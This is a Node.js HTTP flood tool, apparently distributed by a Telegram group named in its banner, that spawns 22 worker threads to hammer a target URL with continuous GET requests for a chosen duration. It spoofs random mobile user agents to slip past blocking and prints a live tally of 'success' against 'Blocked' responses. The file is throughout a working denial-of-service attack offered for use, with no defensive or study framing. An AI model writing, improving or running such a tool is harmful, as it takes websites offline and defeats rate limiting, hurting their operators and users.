const http = require('http');
const { Worker, isMainThread, parentPort } = require('worker_threads');
const url = require('url');

// Helper function to generate random mobile user agent
function generateRandomMobileUserAgent() {
    const androidModels = [
        "SM-G930F", "Nexus 5X", "Mi 11X Pro", "ASUS_X00QD", "OPPO A9 2020", "Huawei P30", 
        "Xiaomi Redmi Note 7 Pro", "Vivo V15 Pro", "LG V20", "Samsung Galaxy A6+"
    ];
    const iosModels = [
        "iPhone X", "iPhone 12", "iPhone 11", "iPhone 8", "iPhone 6S", "iPad Pro", "iPhone SE"
    ];
    const androidVersions = ["6.0", "7.0", "8.1.0", "9", "10", "11"];
    const iosVersions = ["13.3", "14.0", "14.2", "12.4", "11.4"];
    const browsers = ["Chrome", "Safari", "Firefox"];
    
    const isAndroid = Math.random() < 0.5;
    
    let userAgent;
    if (isAndroid) {
        const model = androidModels[Math.floor(Math.random() * androidModels.length)];
        const version = androidVersions[Math.floor(Math.random() * androidVersions.length)];
        const browser = browsers[Math.floor(Math.random() * browsers.length)];
        const browserVersion = (Math.random() * (100 - 50) + 50).toFixed(1);

        userAgent = `Mozilla/5.0 (Linux; Android ${version}; ${model} Build/OPM1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Mobile Safari/537.36`;
    } else {
        const model = iosModels[Math.floor(Math.random() * iosModels.length)];
        const version = iosVersions[Math.floor(Math.random() * iosVersions.length)];
        const browser = browsers[Math.floor(Math.random() * browsers.length)];
        const browserVersion = (Math.random() * (100 - 50) + 50).toFixed(1);

        userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS ${version} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/${browserVersion}.0 Mobile/15E148 Safari/537.36`;
    }
    
    return userAgent;
}

// Worker thread function that sends requests
function sendRequests(targetUrl, durationMs) {
    const startTime = Date.now();

    // Create an HTTP request to the target
    const requestOptions = url.parse(targetUrl);
    requestOptions.method = 'GET';
    
    // Generate random user agent for each request
    const userAgent = generateRandomMobileUserAgent();
    requestOptions.headers = {
        'Connection': 'keep-alive',
        'User-Agent': userAgent
    };

    let totalRequests = 0;
    let successCount = 0;
    let errorCount = 0;

    // Function to log stats every 100ms
    const updateStats = () => {
        const remainingTime = durationMs - (Date.now() - startTime);
        const minutesRemaining = Math.floor(remainingTime / 60000);
        const secondsRemaining = Math.floor((remainingTime % 60000) / 1000);

        // Overwrite the current terminal output with updated stats
        process.stdout.write(
            `SHARKV3 - T.ME/STSVKINGDOM\n` +
            `===========================\n` +
            `total: ${totalRequests}\n` +
            `max-r: ${Math.floor(totalRequests / ((Date.now() - startTime) / 1000))}\n` + // max RPS
            `===========================\n` +
            `success: ${successCount}\n` +
            `Blocked: ${errorCount}\n` +
            `===========================\n` +
            `TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}\r`
        );
    };

    // Send requests continuously until the duration is over
    const intervalId = setInterval(() => {
        const req = http.request(requestOptions, (res) => {
            totalRequests++; // Increment total requests sent

            // We're not tracking success or failure, we just send and ignore responses
            if (res.statusCode === 403 || res.statusCode === 429) {
                errorCount++; // Count blocked requests
            } else {
                successCount++; // Count successful requests (status codes 2xx)
            }

            // Update the log stats
            updateStats();
        });

        req.on('error', (err) => {
            totalRequests++; // Increment total requests sent on error
            errorCount++; // Count any error as a blocked request
            updateStats();
        });

        req.end();

        // Stop after the specified duration
        if (Date.now() - startTime >= durationMs) {
            clearInterval(intervalId);
            console.log(`\nWorker finished. Total requests sent: ${totalRequests}`);
        }
    }, 0); // 0ms to simulate sending requests as fast as possible (no delay)

    // To avoid endless loop in case we fail to clearInterval on time
    setTimeout(() => clearInterval(intervalId), durationMs);
}

// Main function
if (isMainThread) {
    // Parse the command line arguments
    const [,, targetUrl, durationSecs] = process.argv;
    if (!targetUrl || !durationSecs) {
        console.error('Usage: node attack.js <target> <duration in seconds>');
        process.exit(1);
    }

    const durationMs = durationSecs * 1000;
    console.log(`Starting attack on ${targetUrl} for ${durationSecs} seconds with 22 threads...`);

    // Spawn 22 worker threads to flood the target with requests
    const workers = [];
    for (let i = 0; i < 22; i++) {
        const worker = new Worker(__filename);
        worker.on('message', (message) => console.log(message));
        worker.postMessage({ targetUrl, durationMs });
        workers.push(worker);
    }

    // Terminate workers after the duration
    setTimeout(() => {
        workers.forEach(worker => worker.terminate());
        console.log('\nAttack finished.');
    }, durationMs);
} else {
    // Worker thread logic
    parentPort.on('message', (data) => {
        sendRequests(data.targetUrl, data.durationMs);
    });
}
